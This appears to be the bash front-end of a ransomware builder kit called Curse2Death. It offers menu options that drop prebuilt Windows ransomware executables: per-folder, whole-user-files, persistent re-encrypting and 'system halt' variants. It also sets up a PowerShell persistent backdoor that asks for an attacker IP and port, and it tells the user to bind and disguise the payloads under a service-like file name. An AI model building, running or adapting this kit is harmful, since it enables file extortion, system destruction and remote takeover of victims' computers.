cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' 
reset="\033[00m" 
orange='\e[38;5;166m'
help="$okegreen[!] Usage: $reset";

if [ "$1" == "--help" ] || [ "$1" == "-h" ];then
clear
printf "\n\n";

printf "$red   ▄████▄  █    ██  ██▀███    ██████ ▓█████ ▓█████▄ ▓█████ ▄▄▄     ▄▄▄█████▓ ██░ ██         __!_!_
  ▒██▀ ▀█  ██  ▓██▒▓██ ▒ ██▒▒██    ▒ ▓█   ▀ ▒██▀ ██▌▓█   ▀▒████▄   ▓  ██▒ ▓▒▓██░ ██▒     .-'      '-.
 ▒▓█    ▄ ▓██  ▒██░▓██ ░▄█ ▒░ ▓██▄   ▒███   ░██   █▌▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░    /            \.
 ▒▓▓▄ ▄██▒▓▓█  ░██░▒██▀▀█▄    ▒   ██▒▒▓█  ▄ ░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██    |              |
 ▒ ▓███▀ ░▒▒█████▓ ░██▓ ▒██▒▒██████▒▒░▒████▒░▒████▓ ░▒████▒▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓   |,  .-.  .-.  ,|
 ░ ░▒ ▒  ░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░ ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒   | )(__/  \__)( |
   ░  ▒   ░░▒░ ░ ░   ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░ ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░   ░     ▒ ░▒░ ░   |/     /\     \|
   ░         ░░░ ░ ░   ░░   ░ ░  ░  ░     ░    ░ ░  ░    ░    ░   ▒    ░       ░  ░░   (_     ^^     _)
  ░ ░         ░        ░           ░     ░  ░   ░       ░  ░     ░  ░         ░  ░      \__|IIIIII|__/
    ░                                           ░                                        \          /$reset\n"
echo "";
printf "      {{$red Coded & Maintained By$reset$okegreen Predator0x300 ||  Github.com/M4xSec  ||  Predator0x300@gmail.com$reset }}\n\n"
printf "$help\n\n";
printf "{+}$red NOTE: Last 2 are Deadly Ransomware Builds (AT YOUR OWN RISK)\n$reset"
printf "{+}$yellow Current Path Ransom$reset                           : curse2death current\n"
printf "{+}$yellow Entire UserFiles Pwning $reset                      : curse2death drive\n"
printf "{+}$yellow Infection with Banner (Persistent + Loopback)$reset : curse2death infection\n"
printf "{+}$yellow Persistent Hidden Ransom                  $reset    : curse2death persistent\n"
printf "{!}$yellow System Devastate (Persistent + Sys Halt)$reset      : curse2death death\n"
printf "{!}$yellow Powershell (Persistent Backdoor + Ransom)$reset     : curse2death power\n"
            
echo "";            




### Current
elif [ "$1" == "current" ];then

printf "{+}$okegreen Building Ransomware...\n$reset"
sleep 0.5;
printf "{+}$red Target Encryption:$reset$okegreen Current Path (Dir Infection)...\n$reset"
sleep 0.5
printf "$red------------------------------------------------------------- ;) $reset\n";

cp Packages/Ransomwares/Current_Path/Curse2Death.exe .
printf "{!}$red Ransomware Saved as:$reset$okegreen Curse2Death.exe\n$reset"

 
elif [ "$1" == "drive" ];then

printf "{+}$okegreen Building Ransomware...\n$reset"
sleep 0.5;
printf "{+}$red Target Encryption:$reset$okegreen User Files (User Files Infection: Desktop, Documents, Downloads, Music, Pictures, Videos)...\n$reset"
sleep 0.5
printf "$red------------------------------------------------------------- ;) $reset\n";

cp Packages/Ransomwares/Entire_User/Curse2Death_usr.exe .
printf "{!}$red Ransomware Saved as:$reset$okegreen Curse2Death_usr.exe\n$reset"


elif [ "$1" == "infection" ];then

printf "{+}$okegreen Building Ransomware...\n$reset"
sleep 0.5;
printf "{+}$red Target Encryption:$reset$okegreen User Files + Ransomware AnnoyFuck Pop Up (Every 2 Min PopUP)...\n$reset"
sleep 0.5
printf "{+}$red NOTE: Do Not Change the File Name!!!\n$reset"
printf "{+}$red NOTE: If you are Binding/Wrapping, Keep the Name Unchanged!!!\n$reset"
printf "$red------------------------------------------------------------- ;) $reset\n";

cp Packages/Ransomwares/Infection_With Banner/ServiceC2D_Windows.exe .
printf "{!}$red Ransomware Saved as:$reset$okegreen ServiceC2D_Windows.exe\n$reset"


elif [ "$1" == "persistent" ];then

printf "{+}$okegreen Building Ransomware...\n$reset"
sleep 0.5;
printf "{+}$red Target Encryption:$reset$okegreen User Files + Persistent Encryption (Every 2 Min Encryption)...\n$reset"
sleep 0.5
printf "{+}$red NOTE: Do Not Change the File Name!!!\n$reset"
printf "{+}$red NOTE: If you are Binding/Wrapping, Keep the Name Unchanged!!!\n$reset"
printf "$red------------------------------------------------------------- ;) $reset\n";

cp Packages/Ransomwares/Persistent_Entire_User/ServiceC2D_Windows.exe .
printf "{!}$red Ransomware Saved as:$reset$okegreen ServiceC2D_Windows.exe\n$reset"


elif [ "$1" == "death" ];then
printf "{+}$red NOTE: This gonna be Deadly Intake!!!\n$reset"

printf "{+}$okegreen Building Ransomware...\n$reset"
sleep 0.5;
printf "{+}$red Target Encryption:$reset$okegreen User Files + System Halt + Ransom PopUps (System corruption)...\n$reset"
sleep 0.5
printf "{+}$red NOTE: Do Not Change the File Name!!!\n$reset"
printf "{+}$red NOTE: If you are Binding/Wrapping, Keep the Name Unchanged!!!\n$reset"
printf "$red------------------------------------------------------------- ;) $reset\n";

cp Packages/Ransomwares/Creepy_worm/ServiceC2D_Windows.exe .
printf "{!}$red Ransomware Saved as:$reset$okegreen ServiceC2D_Windows.exe\n$reset"


elif [ "$1" == "power" ];then
read -p "Enter Host IP: " host;
read -p "Enter Port: " port;

printf "\n{+}$okegreen Building Ransomware + Backdoor...\n$reset"
sleep 0.5;
printf "{+}$red Target Encryption:$reset$okegreen User Files + Persistent Backdoor (Connection Alive every 5 min)...\n$reset"
sleep 0.5

cp Packages/powershell/power.ps1 .

echo "";

printf "{+}$red NOTE: Do Not Change the File Name!!!\n$reset"
printf "{+}$red NOTE: If you are Binding/Wrapping, Keep the Name Unchanged!!!\n$reset"
printf "$red------------------------------------------------------------- ;) $reset\n";

cp Packages/Ransomwares/Persistent_Entire_User/ServiceC2D_Windows.exe .
printf "{+}$red NOTE: Open power.ps1, change sexydot & sexypot with Your IP & desired Port!\n$reset"
printf "{+}$red NOTE: Convert the power.ps1 ~ power.exe then Bind with Ransomware & keep Name Unchanged (ServiceC2D_Windows)\n$reset"
printf "{!}$red Ransomware Saved as:$reset$okegreen ServiceC2D_Windows.exe\n$reset"
printf "{!}$red Backdoor Saved as:$reset$okegreen power.ps1\n$reset"




else
clear
printf "$red   ▄████▄  █    ██  ██▀███    ██████ ▓█████ ▓█████▄ ▓█████ ▄▄▄     ▄▄▄█████▓ ██░ ██         __!_!_
  ▒██▀ ▀█  ██  ▓██▒▓██ ▒ ██▒▒██    ▒ ▓█   ▀ ▒██▀ ██▌▓█   ▀▒████▄   ▓  ██▒ ▓▒▓██░ ██▒     .-'      '-.
 ▒▓█    ▄ ▓██  ▒██░▓██ ░▄█ ▒░ ▓██▄   ▒███   ░██   █▌▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░    /            \.
 ▒▓▓▄ ▄██▒▓▓█  ░██░▒██▀▀█▄    ▒   ██▒▒▓█  ▄ ░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██    |              |
 ▒ ▓███▀ ░▒▒█████▓ ░██▓ ▒██▒▒██████▒▒░▒████▒░▒████▓ ░▒████▒▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓   |,  .-.  .-.  ,|
 ░ ░▒ ▒  ░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░ ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒   | )(__/  \__)( |
   ░  ▒   ░░▒░ ░ ░   ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░ ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░   ░     ▒ ░▒░ ░   |/     /\     \|
   ░         ░░░ ░ ░   ░░   ░ ░  ░  ░     ░    ░ ░  ░    ░    ░   ▒    ░       ░  ░░   (_     ^^     _)
  ░ ░         ░        ░           ░     ░  ░   ░       ░  ░     ░  ░         ░  ░      \__|IIIIII|__/
    ░                                           ░                                        \          /$reset\n"
echo "";
printf "      {{$red Coded & Maintained By$reset$okegreen Predator0x300 ||  Github.com/M4xSec  ||  Predator0x300@gmail.com$reset }}\n\n"
printf "$help\n\n";
printf "{+}$red NOTE: Last 2 are Deadly Ransomware Builds (AT YOUR OWN RISK)\n$reset"
printf "{+}$yellow Current Path Ransom$reset                           : curse2death current\n"
printf "{+}$yellow Entire UserFiles Pwning $reset                      : curse2death drive\n"
printf "{+}$yellow Infection with Banner (Persistent, Repeated)$reset  : curse2death infection\n"
printf "{+}$yellow Persistent Hidden Ransom                  $reset    : curse2death persistent\n"
printf "{!}$yellow System Devastate (Persistent, Sys Halt)$reset       : curse2death death\n"
printf "{!}$yellow Powershell (Persistent Backdoor + Ransom)$reset     : curse2death power\n"
            
echo "";       


fi
